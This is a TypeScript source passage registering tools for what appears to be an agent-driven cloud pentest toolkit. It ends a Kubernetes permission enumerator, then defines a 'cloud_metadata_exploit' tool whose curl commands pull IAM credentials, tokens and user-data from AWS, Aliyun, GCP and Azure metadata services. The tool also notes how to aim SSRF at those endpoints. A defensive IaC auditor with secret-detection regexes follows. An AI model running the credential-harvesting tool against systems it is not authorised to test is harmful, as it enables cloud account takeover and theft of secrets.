        else out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
        const r2 = run(`kubectl auth can-i '*' '*' --all-namespaces ${ctxOpt}`.trim(), 10000);
        if (r2.ok && /yes/i.test(r2.stdout)) {
          out.push("  ⚠️ 当前身份拥有集群全权限（can-i '*' '*' = yes），可接管集群！");
        }
        // 枚举 clusterrolebindings
        const r3 = run(`kubectl get clusterrolebindings,rolebindings -n ${ns} ${ctxOpt}`.trim(), 10000);
        if (r3.ok) out.push("\n  角色绑定:\n  " + r3.stdout.slice(0, 1000));
      }

      out.push("\n" + "─".repeat(60));
      out.push("■ 攻击面分析完成（以上均为只读枚举，未执行破坏性操作）");
      return out.join("\n");
    },
  });

  // ============================================================
  // 5. cloud_metadata_exploit — 云元数据服务利用
  // ============================================================
  registry.register({
    name: "cloud_metadata_exploit",
    description: "云元数据服务利用：检测云环境并尝试获取 IAM 临时凭据、user-data 脚本（AWS/Aliyun/GCP/Azure）",
    parameters: z.object({
      provider: z.enum(["aws", "aliyun", "gcp", "azure", "auto"]).optional().describe("云服务商，默认 auto（自动探测）"),
      mode: z.enum(["check", "creds", "user_data", "all"]).optional().describe("利用模式，默认 check"),
      port: z.number().optional().describe("元数据服务端口，默认 80"),
    }),
    category: "cloud",
    concurrent: true,
    execute: async (args: any) => {
      const provider = args.provider || "auto";
      const mode = args.mode || "check";
      const port = args.port || 80;
      const out: string[] = [];
      out.push(`[云元数据利用] provider=${provider} mode=${mode} port=${port}`);
      out.push("─".repeat(60));

      const want = (m: string) => mode === "all" || mode === m;

      // 各云元数据端点与命令
      const endpoints: Record<string, { check: string; creds: string; user_data: string; name: string }> = {
        aws: {
          name: "AWS",
          check: `curl -s --connect-timeout 5 http://169.254.169.254:${port}/latest/meta-data/`,
          creds: `curl -s --connect-timeout 5 http://169.254.169.254:${port}/latest/meta-data/iam/security-credentials/`,
          user_data: `curl -s --connect-timeout 5 http://169.254.169.254:${port}/latest/user-data/`,
        },
        aliyun: {
          name: "Aliyun",
          check: `curl -s --connect-timeout 5 http://100.100.100.200:${port}/latest/meta-data/`,
          creds: `curl -s --connect-timeout 5 http://100.100.100.200:${port}/latest/meta-data/ram/security-credentials/`,
          user_data: `curl -s --connect-timeout 5 http://100.100.100.200:${port}/latest/user-data/`,
        },
        gcp: {
          name: "GCP",
          check: `curl -s --connect-timeout 5 -H "Metadata-Flavor: Google" http://169.254.169.254:${port}/computeMetadata/v1/`,
          creds: `curl -s --connect-timeout 5 -H "Metadata-Flavor: Google" http://169.254.169.254:${port}/computeMetadata/v1/instance/service-accounts/default/token`,
          user_data: `curl -s --connect-timeout 5 -H "Metadata-Flavor: Google" http://169.254.169.254:${port}/computeMetadata/v1/instance/attributes/user-data`,
        },
        azure: {
          name: "Azure",
          check: `curl -s --connect-timeout 5 -H "Metadata: true" "http://169.254.169.254:${port}/metadata/instance?api-version=2021-02-01"`,
          creds: `curl -s --connect-timeout 5 -H "Metadata: true" "http://169.254.169.254:${port}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`,
          user_data: `curl -s --connect-timeout 5 -H "Metadata: true" "http://169.254.169.254:${port}/metadata/instance/compute/userData?api-version=2021-02-01"`,
        },
      };

      // 决定要探测的 provider 列表
      const providers = provider === "auto" ? ["aws", "aliyun", "gcp", "azure"] : [provider];
      const detected: string[] = [];

      // mode=check: 检测是否在云环境内
      if (want("check")) {
        out.push("\n■ 云环境探测");
        for (const p of providers) {
          const ep = endpoints[p];
          const r = run(ep.check, 10000);
          const reached = r.ok && r.stdout && !/connection refused|couldn't connect|empty reply|timed out/i.test(r.stdout + r.stderr);
          out.push(`  ${ep.name}: ${reached ? "✅ 可达" : "❌ 不可达"}`);
          if (reached) {
            detected.push(p);
            out.push("    元数据预览:\n    " + r.stdout.slice(0, 600).split("\n").join("\n    "));
          }
        }
        if (detected.length === 0) {
          out.push("\n  ℹ️ 未探测到任何云元数据服务，当前可能不在云 VM 内");
        } else {
          out.push(`\n  ⚠️ 检测到云环境: ${detected.join(", ")}`);
        }
      }

      // mode=creds: 尝试获取 IAM 临时凭据
      if (want("creds")) {
        out.push("\n■ IAM 临时凭据获取");
        const targets = provider === "auto" ? detected.length ? detected : ["aws", "aliyun", "gcp", "azure"] : [provider];
        for (const p of targets) {
          const ep = endpoints[p];
          out.push(`\n  [${ep.name}] 凭据获取:`);
          // AWS 需要先获取角色名再获取凭据
          if (p === "aws") {
            const r = run(ep.creds, 10000);
            if (r.ok && r.stdout && r.stdout.trim()) {
              const roleName = r.stdout.trim().split("\n")[0];
              out.push(`    角色名: ${roleName}`);
              const r2 = run(`curl -s --connect-timeout 5 http://169.254.169.254:${port}/latest/meta-data/iam/security-credentials/${roleName}`, 10000);
              if (r2.ok && r2.stdout) {
                out.push("    ⚠️ 获取到临时凭据:");
                out.push("    " + r2.stdout.slice(0, 1200).split("\n").join("\n    "));
                if (/AccessKeyId|SecretAccessKey|Token/i.test(r2.stdout)) {
                  out.push("    ⚠️ 包含 AccessKeyId / SecretAccessKey / Token，可被用于接管云账号！");
                }
              }
            } else {
              out.push(`    ℹ ${p === "aws" ? "无可访问的 IAM 角色" : "不可达"}`);
            }
          } else {
            const r = run(ep.creds, 10000);
            if (r.ok && r.stdout) {
              out.push("    " + r.stdout.slice(0, 1000).split("\n").join("\n    "));
              if (/access_token|access_key|secret|token/i.test(r.stdout)) {
                out.push(`    ⚠️ ${ep.name} 返回了凭据信息，注意保护与利用`);
              }
            } else {
              out.push("    ℹ 不可达或无凭据");
            }
          }
        }
      }

      // mode=user_data: 获取 user-data 脚本
      if (want("user_data")) {
        out.push("\n■ user-data 脚本获取");
        const targets = provider === "auto" ? detected.length ? detected : ["aws", "aliyun", "gcp", "azure"] : [provider];
        for (const p of targets) {
          const ep = endpoints[p];
          out.push(`\n  [${ep.name}] user-data:`);
          const r = run(ep.user_data, 10000);
          if (r.ok && r.stdout && r.stdout.trim()) {
            out.push("    " + r.stdout.slice(0, 1500).split("\n").join("\n    "));
            if (/password|secret|api[_-]?key|access[_-]?key|AKIA|token/i.test(r.stdout)) {
              out.push("    ⚠️ user-data 中可能包含敏感信息（密码/密钥）！");
            }
          } else {
            out.push("    ℹ 无 user-data 或不可达");
          }
        }
      }

      out.push("\n" + "─".repeat(60));
      out.push("■ 提示：云元数据服务仅在同 VPC/VM 内可达，外网默认不可访问。");
      out.push("  SSRF 利用时需将目标指向 169.254.169.254 或 100.100.100.200。");
      return out.join("\n");
    },
  });

  // ============================================================
  // 6. terraform_audit — IaC 配置审计
  // ============================================================
  registry.register({
    name: "terraform_audit",
    description: "IaC 配置审计：扫描 Terraform/CloudFormation 项目的公开 IP、开放端口、未加密资源、硬编码密钥等问题",
    parameters: z.object({
      project_path: z.string().describe("Terraform/CloudFormation 项目路径"),
      framework: z.enum(["terraform", "cloudformation", "auto"]).optional().describe("IaC 框架，默认 auto 自动识别"),
      checks: z.array(z.string()).optional().describe("检查项: public_ip|open_ports|encryption|iam|secrets|all，默认 all"),
    }),
    category: "cloud",
    concurrent: true,
    execute: async (args: any) => {
      const projectPath = args.project_path;
      const framework = args.framework || "auto";
      const checks: string[] = args.checks && args.checks.length ? args.checks : ["all"];
      const out: string[] = [];
      out.push(`[IaC 审计] path=${projectPath} framework=${framework} checks=${checks.join(",")}`);
      out.push("─".repeat(60));

      // 路径存在性检查
      if (!fs.existsSync(projectPath)) {
        return `❌ 路径不存在: ${projectPath}`;
      }
      const stat = fs.statSync(projectPath);
      if (!stat.isDirectory()) {
        return `❌ 路径不是目录: ${projectPath}`;
      }

      const checkAll = checks.includes("all");
      const want = (c: string) => checkAll || checks.includes(c);

      // 识别框架
      let detectedFramework = framework;
      if (framework === "auto") {
        const tfFiles = collectFiles(projectPath, [".tf"]);
        const cfFiles = collectFiles(projectPath, [".json", ".yaml", ".yml"]);
        if (tfFiles.length > 0) {
          detectedFramework = "terraform";
        } else if (cfFiles.length > 0) {
          detectedFramework = "cloudformation";
        } else {
          detectedFramework = "terraform";
        }
        out.push(`  自动识别框架: ${detectedFramework}`);
      }

      // 优先用专业工具
      if (detectedFramework === "terraform") {
        if (isInstalled("tfsec")) {
          out.push("\n■ 使用 tfsec 扫描");
          const r = run(`tfsec ${projectPath} --format text`, 60000);
          if (r.ok || r.stdout) out.push(r.stdout.slice(0, 3000));
          else out.push(`  ❌ tfsec 失败: ${r.stderr.slice(0, 300)}`);
        } else if (isInstalled("checkov")) {
          out.push("\n■ 使用 checkov 扫描");
          const r = run(`checkov -d ${projectPath} --framework terraform`, 60000);
          if (r.ok || r.stdout) out.push(r.stdout.slice(0, 3000));
          else out.push(`  ❌ checkov 失败: ${r.stderr.slice(0, 300)}`);
        } else {
          out.push("\n■ 未检测到 tfsec / checkov，使用正则降级扫描");
          out.push("  安装建议: brew install tfsec / pip install checkov");
          return regexAudit(projectPath, [".tf"], want, out);
        }
      } else {
        if (isInstalled("cfn-nag")) {
          out.push("\n■ 使用 cfn-nag 扫描");
          const r = run(`cfn_nag_scan --input-path ${projectPath}`, 60000);
          if (r.ok || r.stdout) out.push(r.stdout.slice(0, 3000));
          else out.push(`  ❌ cfn-nag 失败: ${r.stderr.slice(0, 300)}`);
        } else {
          out.push("\n■ 未检测到 cfn-nag，使用正则降级扫描");
          out.push("  安装建议: gem install cfn-nag");
          return regexAudit(projectPath, [".json", ".yaml", ".yml", ".template"], want, out);
        }
      }

      return out.join("\n");
    },
  });

  return registry;
}

/**
 * 递归收集指定扩展名的文件。
 */
function collectFiles(dir: string, exts: string[]): string[] {
  const results: string[] = [];
  let entries: fs.Dirent[];
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch {
    return results;
  }
  for (const entry of entries) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      // 跳过常见无关目录
      if (entry.name === "node_modules" || entry.name === ".git" || entry.name === ".terraform") continue;
      results.push(...collectFiles(full, exts));
    } else if (exts.some((e) => entry.name.endsWith(e))) {
      results.push(full);
    }
  }
  return results;
}

/**
 * 正则降级扫描：检查 .tf/.json 文件中的常见安全问题。
 */
function regexAudit(
  projectPath: string,
  exts: string[],
  want: (c: string) => boolean,
  out: string[],
): string {
  const files = collectFiles(projectPath, exts);
  out.push(`  扫描文件数: ${files.length}`);
  const findings: string[] = [];

  for (const file of files) {
    let content = "";
    try {
      content = fs.readFileSync(file, "utf-8");
    } catch {
      continue;
    }
    const rel = path.relative(projectPath, file);

    // public_ip: 公开 IP 分配
    if (want("public_ip")) {
      if (/associate_public_ip_address\s*=\s*true/i.test(content)) {
        findings.push(`  ⚠️ [public_ip] ${rel}: associate_public_ip_address = true（资源将获得公网 IP）`);
      }
      if (/"Engine"\s*:.*"VPC"|PublicIp|public_ip/i.test(content) && /true/i.test(content)) {
        findings.push(`  ⚠️ [public_ip] ${rel}: 检测到公网 IP 相关配置`);
      }
    }

    // open_ports: 开放端口（0.0.0.0/0 ingress）
    if (want("open_ports")) {
      const ingressMatches = content.match(/cidr_blocks\s*=\s*\[?"0\.0\.0\.0\/0"?\]?/gi);
      if (ingressMatches) {
        findings.push(`  ⚠️ [open_ports] ${rel}: 检测到 0.0.0.0/0 ingress（开放给全网，共 ${ingressMatches.length} 处）`);
      }
      if (/CidrIp"\s*:\s*"0\.0\.0\.0\/0"/i.test(content)) {
        findings.push(`  ⚠️ [open_ports] ${rel}: CloudFormation SecurityGroup 含 0.0.0.0/0`);
      }
    }

    // encryption: 未加密资源
    if (want("encryption")) {
      if (/encryption\s*=\s*false|encrypted\s*=\s*false/i.test(content)) {
        findings.push(`  ⚠️ [encryption] ${rel}: encryption = false（资源未加密）`);
      }
      if (/kms_key_id|encrypt/i.test(content) === false && /ebs_block_device|aws_ebs_volume|aws_db_instance/i.test(content)) {
        findings.push(`  ℹ️ [encryption] ${rel}: 存储资源未显式配置加密`);
      }
    }

    // iam: IAM 过度权限
    if (want("iam")) {
      if (/Action\s*=\s*"\*"|Effect\s*=\s*"Allow".*Action.*\*/s.test(content)) {
        findings.push(`  ⚠️ [iam] ${rel}: IAM 策略使用 Action "*"（过度授权）`);
      }
      if (/"Action"\s*:\s*"\*"/i.test(content)) {
        findings.push(`  ⚠️ [iam] ${rel}: CloudFormation IAM Policy Action: "*"`);
      }
    }

    // secrets: 硬编码密钥
    if (want("secrets")) {
      if (/access_key\s*=\s*"[A-Z0-9]{16,}"|secret_key\s*=\s*"[A-Za-z0-9+/]{40}"/i.test(content)) {
        findings.push(`  ⚠️ [secrets] ${rel}: 检测到硬编码 access_key/secret_key 明文！`);
      }
      if (/"AWS_ACCESS_KEY_ID"\s*:\s*"[A-Z0-9]"/i.test(content)) {
        findings.push(`  ⚠️ [secrets] ${rel}: CloudFormation 含硬编码 AWS 凭据`);
      }
      if (/password\s*=\s*"[^"]{8,}"/i.test(content) && !/variable|default|sensitive/i.test(content)) {
        findings.push(`  ⚠️ [secrets] ${rel}: 检测到疑似硬编码 password 明文`);
      }
    }
  }

  out.push(`\n■ 审计发现（共 ${findings.length} 项）`);
  if (findings.length === 0) {
    out.push("  ✅ 未发现明显安全问题");
  } else {
    findings.forEach((f) => out.push(f));
  }
  out.push("\n■ 建议");
  out.push("  • 安装专业工具获得更完整检测: tfsec / checkov / cfn-nag");
  out.push("  • 将敏感凭据移至变量或 Secrets Manager，勿硬编码");
  out.push("  • 收敛 0.0.0.0/0 与 IAM Action: * 的范围");
  return out.join("\n");
}
